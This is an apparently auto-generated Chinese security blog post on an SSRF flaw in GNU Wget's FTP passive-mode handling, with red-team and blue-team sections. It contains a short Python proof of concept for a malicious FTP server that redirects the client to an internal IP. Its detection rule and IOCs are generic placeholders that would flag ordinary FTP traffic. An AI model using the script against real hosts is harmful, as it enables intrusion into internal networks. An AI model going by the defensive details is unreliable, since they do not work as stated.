---
layout: post
title:  "GNU Wget存在SSRF漏洞，恐遭濫用存取內部網路資源"
date:   2026-07-16 07:59:59 +0000
categories: [security]
severity: medium
---

# ⚠️ 解析 GNU Wget 中的伺服器端請求偽造（SSRF）漏洞 CVE-2026-15146

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS 分數：5.9)
> * **受駭指標**: SSRF（伺服器端請求偽造）
> * **關鍵技術**: FTP 被動連線模式（PASV），SSRF 攻擊，IP 位址驗證

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: 漏洞源自 GNU Wget 在 FTP 被動連線模式（PASV）運作時，未驗證伺服器回應中提供的 IP 位址。這使得惡意 FTP 伺服器或重新導向 FTP URL 的 HTTP 伺服器可以藉此將 GNU Wget 的 FTP 連線導向至任意 IP 位址與連接埠，進而透過 SSRF 攻擊存取 GNU Wget 主機與內部網路資源。
* **攻擊流程圖解**:
  1. User Input -> GNU Wget 處理 FTP URL
  2. GNU Wget 啟動 FTP 被動連線模式（PASV）
  3. 惡意 FTP 伺服器或 HTTP 伺服器回應任意 IP 位址與連接埠
  4. GNU Wget 導向至任意 IP 位址與連接埠
  5. SSRF 攻擊存取 GNU Wget 主機與內部網路資源
* **受影響元件**: GNU Wget 的版本號與環境未指定，但所有使用 FTP 被動連線模式（PASV）的 GNU Wget 版本都可能受影響。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 惡意 FTP 伺服器或重新導向 FTP URL 的 HTTP 伺服器，GNU Wget 的版本號與環境。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    
    # 惡意 FTP 伺服器回應任意 IP 位址與連接埠
    def handle_ftp_connection(ftp_socket):
        ftp_socket.send(b"227 Entering Passive Mode (192,168,1,100,10,20)\r\n")
    
    # 建立惡意 FTP 伺服器
    ftp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ftp_server_socket.bind(("0.0.0.0", 21))
    ftp_server_socket.listen(1)
    
    while True:
        ftp_client_socket, _ = ftp_server_socket.accept()
        handle_ftp_connection(ftp_client_socket)
        ftp_client_socket.close()
    
    ```
  *範例指令*: 使用 `curl` 或 `nmap` 模組進行 SSRF 攻擊。
* **繞過技術**: 可以使用 WAF 或 EDR 繞過技巧，例如使用代理伺服器或修改 HTTP 請求頭。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  | 192.168.1.100 | example.com | /etc/ftp.conf |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule SSRF_Detection {
      meta:
        description = "SSRF 攻擊偵測"
        author = "Your Name"
      strings:
        $ftp_passive_mode = "227 Entering Passive Mode"
      condition:
        $ftp_passive_mode
    }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。
* **緩解措施**: 除了更新修補程式外，還可以修改 GNU Wget 的設定檔，例如 `/etc/wgetrc`，以禁用 FTP 被動連線模式（PASV）。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **SSRF (Server-Side Request Forgery)**: 想像一個網站可以將使用者的請求轉發給其他網站。技術上是指攻擊者可以藉由伺服器的請求轉發機制，存取伺服器內部網路或其他網站的資源。
* **FTP 被動連線模式 (PASV)**: 想像兩個電腦之間的連線需要一個中間人。技術上是指 FTP 伺服器在被動連線模式下，會回應一個 IP 位址與連接埠給 FTP 客戶端，讓客戶端可以連線到伺服器。
* **IP 位址驗證**: 想像一個網站需要驗證使用者的 IP 位址。技術上是指伺服器需要驗證使用者的 IP 位址是否合法，避免攻擊者使用假的 IP 位址進行攻擊。

## 5. 🔗 參考文獻與延伸閱讀

- [原始報告](https://www.ithome.com.tw/news/177367)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


